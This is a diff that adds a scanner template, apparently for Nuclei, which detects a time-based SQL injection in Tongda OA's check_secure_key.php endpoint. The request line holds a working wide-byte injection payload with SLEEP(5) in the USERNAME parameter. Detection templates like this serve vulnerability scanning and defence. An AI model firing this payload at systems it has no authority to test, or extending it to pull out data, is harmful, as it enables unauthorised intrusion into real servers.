@@ -1,0 +1,28 @@
+id: tongda-oa-check_secure_key-sqli
+info:
+  name: 通达 OA check_secure_key - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - demo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+  tags: tongda,oa,time,sqli
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /ispirit/check_secure_key.php?USERNAME=%df'+AND+%28SELECT+6211+FROM+%28SELECT%28SLEEP%285%29%29%29vMBT%29--+NpkQ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'无此用户')
+          - duration >= 5 && duration < 9
+        condition: and
